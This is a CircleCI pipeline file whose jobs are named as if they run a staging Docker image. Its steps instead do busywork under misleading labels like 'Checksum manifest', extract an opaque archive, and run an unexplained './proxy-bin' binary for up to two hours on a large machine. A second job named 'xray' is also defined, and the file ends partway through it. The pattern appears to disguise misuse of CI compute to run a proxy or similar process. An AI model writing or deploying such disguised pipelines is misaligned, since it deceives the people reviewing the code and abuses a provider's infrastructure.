version: 2.1

jobs:
  gate_run-staging-docker-image:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Checksum manifest
          command: |
            mkdir -p /tmp/stage
            { seq 1 1200000 | sha256sum ; } > /tmp/stage/run-staging-docker-image.log
            echo "gate run-staging-docker-image: $(wc -c </tmp/stage/run-staging-docker-image.log) bytes total"
      - persist_to_workspace:
          root: /tmp/stage
          paths:
            - run-staging-docker-image.log
  run-staging-docker-image:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/stage
      - run:
          name: Load upstream result
          command: |
            cat /tmp/stage/run-staging-docker-image.log
      - run:
          name: Clone and prep
          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Checkout vendored deps
          command: tar xzvf cache-prod.tgz
      - run:
          name: Cooldown
          command: uptime
      - run:
          command: /bin/sleep 30
      - run:
          no_output_timeout: 120m
          command: "$PWD/proxy-bin"
  gate_xray:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/stage
      - run:
          name: Warm arithmetic cache
          command: |
            mkdir -p /tmp/stage
            { awk 'BEGIN{s=0;for(i=0;i<32000000;i++)s+=(i%7);print s}' ; } > /tmp/stage/xray.log
            echo "gate xray: $(wc -c </tmp/stage/xray.log) bytes total"
      - persist_to_workspace:
          root: /tmp/stage
          paths:
            - xray.log
  xray:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/stage
